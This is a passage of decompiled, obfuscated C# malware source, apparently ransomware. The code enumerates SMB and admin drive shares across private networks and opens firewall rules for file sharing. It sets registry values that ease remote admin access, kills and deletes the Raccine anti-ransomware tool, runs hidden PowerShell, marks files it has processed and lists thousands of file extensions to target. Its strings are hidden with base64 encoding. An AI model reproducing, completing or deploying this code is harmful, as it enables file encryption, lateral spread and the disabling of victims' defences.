	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("bmV0LmV4ZQ=="), "user " + text + " " + jHwmMpCrffccro);
	}

	public static List<string> GCjdUtvDWjnvnD()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementClass val = new ManagementClass("Win32_Share");
		List<string> list = new List<string>();
		try
		{
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					object obj = ((ManagementBaseObject)val2).get_Item("Name");
					if (!list.Contains("\\\\" + val2.get_Path().get_Server() + "\\" + obj.ToString()!.Replace("IPC$", "").Replace("ADMIN$", "")))
					{
						list.Add("\\\\" + val2.get_Path().get_Server() + "\\" + obj.ToString()!.Replace("IPC$", "").Replace("ADMIN$", ""));
					}
				}
				return list;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
			return null;
		}
	}

	private static void RKhzhpGZREiyW()
	{
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_020e: Expected O, but got Unknown
		//IL_0230: Unknown result type (might be due to invalid IL or missing references)
		//IL_0237: Expected O, but got Unknown
		WMeimyLLMSxIr();
		List<chzkAitvHQDCcEd> list = chzkAitvHQDCcEd.MohkJvMFGBDqoB();
		foreach (chzkAitvHQDCcEd item in list)
		{
			yeyrItoqAVY.Add(item.lMtvCPvYiCbyR);
		}
		Parallel.ForEach(yeyrItoqAVY, delegate(string ebBBDJcoSwWRo)
		{
			if ((!ebBBDJcoSwWRo.StartsWith("10.") && !ebBBDJcoSwWRo.StartsWith("172.") && !ebBBDJcoSwWRo.StartsWith("192.168.") && !ebBBDJcoSwWRo.StartsWith("")) || !bOiDbXVJjvh.uEygpOkJTInhS(ebBBDJcoSwWRo))
			{
				return;
			}
			try
			{
				Thread.Sleep(PXrJUxZGiZRJBh);
				lZNmNTLNdP.Add("\\\\" + ebBBDJcoSwWRo + "\\Users");
				try
				{
					if (MFBaFacYIYTeS)
					{
						Console.WriteLine("\\\\" + ebBBDJcoSwWRo + "\\Users");
					}
				}
				catch
				{
				}
				Parallel.For(68, 91, delegate(int g)
				{
					Thread.Sleep(PXrJUxZGiZRJBh);
					lZNmNTLNdP.Add("\\\\" + ebBBDJcoSwWRo + "\\" + (char)g + "$");
					try
					{
						if (MFBaFacYIYTeS)
						{
							Console.WriteLine("\\\\" + ebBBDJcoSwWRo + "\\" + (char)g + "$");
						}
					}
					catch
					{
					}
				});
			}
			catch
			{
			}
		});
		try
		{
			bOiDbXVJjvh.wZvvoLyaVxBvDw wZvvoLyaVxBvDw = new bOiDbXVJjvh.wZvvoLyaVxBvDw(bOiDbXVJjvh.PstUJcONkua.YWNlxRWVRmCDjn, bOiDbXVJjvh.lwgPZNEaIbBf.ABMWpPiRpnr, bOiDbXVJjvh.inFdEHpDeqvZ.xQIIaGiuzSc, bOiDbXVJjvh.nDQjXdXxUNGUlH.YQxZHpZXWUdiB);
			foreach (string item2 in wZvvoLyaVxBvDw)
			{
				MatchCollection matchCollection = Regex.Matches(item2, "\\\\\\\\[a-zA-Z0-9\\.\\-_]{1,}(\\\\[a-zA-Z0-9\\-_]{1,}){1,}[\\$]{0,1}");
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!lZNmNTLNdP.Contains(item3.ToString()))
						{
							lZNmNTLNdP.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (MFBaFacYIYTeS)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		XTKLZTGcprgcA.agWAIMteLnZT();
		try
		{
			if (MFBaFacYIYTeS)
			{
				Console.WriteLine("Network scanning completed...");
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string fYcEkUSHofqF = izdftkkvVp("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jLGThbkXlozfB(fYcEkUSHofqF), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(jLGThbkXlozfB("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), 1, RegistryValueKind.DWord);
					registryKey.SetValue(jLGThbkXlozfB("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (jFHIFsIuvqjiRrm == "YES")
		{
			aZrdpiZJwtSJIHi.hPWtNZjkCEaxdhv();
		}
		try
		{
			if (MFBaFacYIYTeS)
			{
				Console.WriteLine("Scanning for manually mapped resources...");
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (lZNmNTLNdP.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (MFBaFacYIYTeS)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
							.Replace("\"", "")
							.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
					}
				}
				catch
				{
				}
				lZNmNTLNdP.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (MFBaFacYIYTeS)
			{
				Console.WriteLine("Scanning for manually mapped resources completed...");
			}
		}
		catch
		{
		}
	}

	public static bool CVygjsJiqVXAn()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void taIBdDARBKkh(string YljxFqdeXXepMEb)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = jLGThbkXlozfB("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + YljxFqdeXXepMEb;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool FhRtjohbGZtJz(string zQnyMWfNVhFeLUl, string OTxYfjGjIKD)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(zQnyMWfNVhFeLUl, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(OTxYfjGjIKD);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(zQnyMWfNVhFeLUl, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool fmXeXgdtFs(string bgWMWCGZrGtGx)
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			string NOYqDnYIDaRU = Path.GetPathRoot(bgWMWCGZrGtGx);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo d) => d.RootDirectory.Name == NOYqDnYIDaRU);
			return driveInfo != null && driveInfo.DriveFormat == "NTFS";
		}
		catch
		{
			return false;
		}
	}

	public static string ErWGFfBddhzOUKw(SecureString twjZQQPkuei)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(twjZQQPkuei);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void RXVsGvXUCNvyC()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string fYcEkUSHofqF = izdftkkvVp("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jLGThbkXlozfB(fYcEkUSHofqF), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(jLGThbkXlozfB("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(jLGThbkXlozfB("d21pYy5leGU="));
					registryKey.DeleteSubKey(jLGThbkXlozfB("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(jLGThbkXlozfB("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(jLGThbkXlozfB("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(jLGThbkXlozfB("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(jLGThbkXlozfB("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				fYcEkUSHofqF = izdftkkvVp("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(jLGThbkXlozfB(fYcEkUSHofqF), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(jLGThbkXlozfB("UmFjY2luZQ=="));
					registryKey.Close();
				}
				fYcEkUSHofqF = izdftkkvVp("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(jLGThbkXlozfB(fYcEkUSHofqF), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(jLGThbkXlozfB("UmFjY2luZQ=="));
					registryKey.Close();
				}
				fYcEkUSHofqF = izdftkkvVp("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(jLGThbkXlozfB(fYcEkUSHofqF), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(jLGThbkXlozfB("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
			UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("dGFza2tpbGw="), jLGThbkXlozfB("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("cmVn"), jLGThbkXlozfB(izdftkkvVp("=Y0LgISehJHVgUmbpN2YhJlIgY1LgIib1JFXu9WazJXZWRnblJnc1NEXzd3bk5WaXxFdm92cvJ3Yp1EXFJVQXRlRPNFXVN0SIJCIlRXZsVGZ")));
			UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("cmVn"), jLGThbkXlozfB("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("c2NodGFza3M="), jLGThbkXlozfB("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void AMIJuyhJOIXX(string oasbbcAonQcQuS, byte[] DZTPFQhFBblqknT)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(jLGThbkXlozfB("R290QWxsRG9uZQ=="));
			using FileStream fileStream = new FileStream(oasbbcAonQcQuS, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(DZTPFQhFBblqknT, 0, DZTPFQhFBblqknT.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void pJkCjbTuLamHj()
	{
		string fYcEkUSHofqF = izdftkkvVp("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jLGThbkXlozfB(fYcEkUSHofqF), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(jLGThbkXlozfB("TG9uZ1BhdGhzRW5hYmxlZA=="), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void WMeimyLLMSxIr()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("bmV0c2g="), jLGThbkXlozfB("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJOZXR3b3JrIERpc2NvdmVyeVwiIG5ldyBlbmFibGU9WWVz"));
			UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("bmV0c2g="), jLGThbkXlozfB("YWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2V0IHJ1bGUgZ3JvdXA9XCJGaWxlIGFuZCBQcmludGVyIFNoYXJpbmdcIiBuZXcgZW5hYmxlPVllcw=="));
		}
	}

	public static void gxcrgYEOUkuuRF(string pJFxifIJQNR)
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				arKJyakwbrEs(pJFxifIJQNR, new string[4822]
				{
					"$$$", "$db", "$efs", "$er", "^^^", "__a", "__b", "{pb", "~cw", "~hm",
					"0", "000", "001", "1", "101", "103", "108", "110", "113", "123",
					"128", "17t", "1CD", "1pe", "1ph", "1sp", "1st", "2", "2mg", "2Q0",
					"2QM", "3", "3d", "3d4", "3dd", "3df", "3df8", "3dm", "3dmdef", "3dp",
					"3dr", "3ds", "3dt", "3dw", "3dxml", "3fr", "3g2", "3ga", "3gp", "3gp2",
					"3me", "3MF", "3mm", "3pe", "3pr", "3w", "4dd", "4dl", "4dv", "4fs",
					"4w7", "5vw", "602", "73b", "73c", "73l", "7z", "7z001", "7z002", "7zip",
					"8", "86f", "89t", "89y", "8ba", "8bc", "8be", "8bf", "8bi8", "8bl",
					"8bs", "8bx", "8by", "8li", "8svx", "8xg", "8xk", "8xs", "8xt", "8xv",
					"9xt", "9xy", "a$v", "a00", "a01", "a02", "a2c", "a5l", "a5w", "a65",
					"aa", "aa3", "aac", "aaf", "aah", "aam", "aao", "aaui", "ab", "ab1",
					"ab3", "ab4", "ab65", "aba", "abbu", "abc", "abcd", "abf", "abi", "abk",
					"abkprj", "abp", "abt", "abw", "aby", "ac2", "ac3", "ac5", "aca", "acc",
					"accdb", "accdc", "accde", "accdr", "accdt", "accft", "ACCTB", "ace", "acf", "acg",
					"ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings", "acrodata", "acroplugin", "acrypt", "act",
					"acz", "ad", "ada", "adb", "adc", "adcp", "add", "addism", "ade", "adf",
					"adi", "adif", "adoc", "ados", "adox", "adp", "adpb", "adr", "ads", "adt",
					"adu", "adv", "advs", "adx", "adz", "aea", "aec", "aep", "aepx", "aes",
					"aet", "afd", "afdesign", "afe", "aff", "afi", "afm", "afp", "aft", "agd",
					"agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec", "age3xsav", "age3xscn", "age3yrec", "age3ysav",
					"age3yscn", "aggr", "ahf", "ai", "aif", "aifb", "aiff", "aim", "ain", "AIO",
					"aip", "ais", "ait", "ak", "al", "al8", "ala", "alb3", "alb4", "alb5",
					"alb6", "alc", "ald", "aldf", "alf", "ali", "allet", "alt3", "alt5", "alz",
					"AM", "amb", "amc", "amf", "aml", "amm", "amr", "amsorm", "amt", "amu",
					"amx", "amxx", "an1", "an8", "anime", "anl", "anme", "ann", "ans", "ansr",
					"ansym", "anx", "aoi", "ap", "apa", "apalbum", "apd", "ape", "apf", "aph",
					"api", "apj", "apk", "aplibrary", "apnx", "apo", "app", "APPCACHE", "approj", "APPX",
					"apr", "apt", "apw", "apxl", "apz", "ar", "arc", "arch00", "archiver", "arduboy",
					"arff", "ari", "arj", "arn", "aro", "arr", "ars", "art", "arw", "as",
					"as$", "as3", "asa", "asc", "ascm", "ascx", "asd", "ase", "asf", "ashbak",
					"ashdisc", "ashprj", "ashx", "ask", "asl", "asm", "asmx", "asn", "asnd", "asp",
					"aspx", "asr", "asset", "ast", "asv", "asvx", "asx", "atf", "ath", "atl",
					"atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux", "av", "avc", "avhd", "avhdx",
					"avj", "avl", "avn", "avp", "avs", "AW", "awb", "awbr", "awd", "awdb",
					"awe", "awg", "awp", "aws", "awt", "aww", "awwp", "ax", "azf", "azs",
					"azw", "azw1", "azw3", "azw4", "azz", "azzx", "b", "b1", "b27", "b2a",
					"b5i", "b5t", "b64", "b6i", "b6t", "b6z", "ba", "ba6", "ba7", "ba8",
					"ba9", "bac", "back", "backup", "backupdb", "bad", "bafl", "bak", "bak~", "bak2",
					"bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj", "bau", "bax", "bay", "bbb",
					"bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz", "bc", "bc5", "bc6", "bc7",
					"bcc", "bcd", "bci", "bck", "bckp", "bcl", "bcm", "bcp", "bct", "bdb",
					"bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp", "bdr", "bdt2", "bdt3", "bean",
					"bed", "bfa", "bff", "bfx", "bgl", "bgt", "bgv", "bh", "bho", "bi8",
					"bib", "bibtex", "bic", "bif", "bifx", "big", "bik", "bil", "bim", "bin",
					"bina", "binary", "bionix", "BIT", "bizdocument", "bjl", "bjo", "bk", "bk!", "bk1",
					"bk2", "bk3", "bk4", "bk5", "bk6", "bk7", "bk8", "bk9", "bkc", "bkf",
					"bkg", "bkp", "bks", "bkup", "bkz", "blb", "bld", "blend", "blend1", "blend2",
					"blg", "blk", "blm", "bln", "blob", "blockplt", "blogthis", "blp", "bluebutton", "bm2",
					"bm3", "bmc", "bmf", "bmk", "bml", "bmm", "bmml", "bmpr", "bms", "bna",
					"bndl", "bnk", "boc", "bok", "boo", "book", "bookexport", "bop", "box", "bp1",
					"bp2", "bp3", "bpa", "bpb", "bpd", "bpdx", "bpf", "bphys", "bpj", "bpk",
					"bpl", "bplx", "bpm", "bpmc", "bpn", "bps", "bpw", "brain", "brd", "breaking_bad",
					"brf", "brh", "brl", "brn", "BROWSER", "brs", "brw", "brx", "bsa", "bsd",
					"bsdl", "bsk", "bso", "bsp", "bst", "btd", "btf", "btif", "btinstall", "BTL",
					"btm", "btoa", "btr", "btx", "BUD", "bul", "bundle", "bup", "burn", "burntheme",
					"bvd", "bvp", "bwa", "bwd", "bwf", "bwi", "bwp", "bws", "bwt", "bwz",
					"BXF", "bxx", "bz", "bz2", "bza", "bzabw", "bzip", "bzip2", "c", "c00",
					"c01", "c02", "c10", "c2e", "c3d", "c4p", "c6", "cadoc", "cae", "caf",
					"cag", "calca", "cam", "camm", "camproj", "cap", "capt", "capx", "car", "caro",
					"cas", "cat", "catproduct", "cav", "cawr", "cb7", "cba", "cbf", "cbg", "cbmap",
					"cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc", "cca", "ccc", "ccd",
					"ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd", "cd1", "cd2", "cdb",
					"cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl", "cdm", "cdml", "cdmm",
					"cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5", "cdr6", "cdrw", "cds",
					"cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef", "cel", "celtx", "cenon~",
					"cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd", "cfg", "cfp", "cfr",
					"cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp", "chg", "chi", "chk",
					"chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht", "chtml", "cib", "cida",
					"cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9", "ckp", "ckt", "cl2",
					"cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist", "clb", "cld", "clg",
					"clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk", "clkv", "clm", "clp",
					"clr", "cls", "clx", "cm10", "cm5", "cma", "cmap", "CMB", "cmbl", "cmf",
					"cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna", "cnf", "cng", "cnt",
					"cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS", "compositionmodel", "compositiontemplate", "con",
					"conf", "config", "contact", "converterx", "cp", "cp9", "CPA", "cpaa", "cpc", "cpd",
					"cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk", "cpmz", "cpp", "cpt",
					"cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb", "crd", "crds", "creole",
					"crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr", "crtx", "crw", "crwl",
					"cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall", "cryptra", "cs", "cs8",
					"csa", "csd", "cse", "CSG", "csh", "csi", "csl", "csm", "cso", "csp",
					"csr", "css", "cst", "csv", "ctb", "ctbl", "ctd", "cte", "ctf", "CTG",
					"ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3", "ctx", "ctxt", "cty",
					"cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva", "cvd", "cvj", "cvl",
					"cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr", "cws", "cww", "cwwp",
					"cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi", "cyo", "cys", "czi",
					"czip", "czp", "d", "d00", "d01", "d3dbsp", "d64", "d88", "da0", "da2",
					"daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf", "dag", "dal", "dam",
					"dao", "dap", "dar", "das", "daschema", "dash", "dat", "DATA", "database", "datx",
					"dax", "dayzprofile", "dazip", "db", "db_journal", "db0", "db3", "dba", "dbb", "dbc",
					"dbcrypt12", "dbcrypt8", "dbd", "dbf", "DBF", "dbfv", "dbgsym", "db-journal", "dbk", "dbr",
					"dbs", "db-shm", "dbt", "dbv", "db-wal", "dbx", "dc2", "dc4", "dca", "dcb",
					"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
					"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
					"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
					"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
					"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
					"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
					"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
					"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
					"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
					"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
					"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
					"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
					"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
					"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
					"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
					"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
					"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
					"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
					"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
					"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
					"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
					"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
					"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
					"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
					"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
					"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
					"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
					"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
					"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
					"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
					"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
					"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
					"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "epf",
					"EPF", "epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub",
					"epw", "eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err",
					"ersx", "es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm",
					"esp", "esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt",
					"ets", "ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p",
					"ev3s", "evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc",
					"exd", "exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez",
					"ezc", "ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90",
					"f96", "fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta",
					"fax", "fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw",
					"fcd", "fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct",
					"fd", "fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds",
					"fdseq", "fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff",
					"ffa", "ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx",
					"fg3", "fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin",
					"fingnet", "fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg",
					"flib", "flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp",
					"fls", "flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat",
					"fmc", "fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk",
					"fnf", "fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol",
					"folio", "folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3",
					"fp4", "fp5", "fp7", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk",
					"fplinkbar", "fpp", "fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag",
					"frameset", "frd", "frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs",
					"fsa", "fsc", "fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10",
					"ft11", "ft7", "ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw",
					"ful", "fwbackup", "fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo",
					"fxp", "fxr", "fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m",
					"g41", "ga3", "gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1",
					"gb2", "gbi", "gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca",
					"gcd", "gcg", "gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable",
					"gdc", "gdf", "GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom",
					"gen", "genbank", "geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs",
					"gfx", "ggb", "ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh",
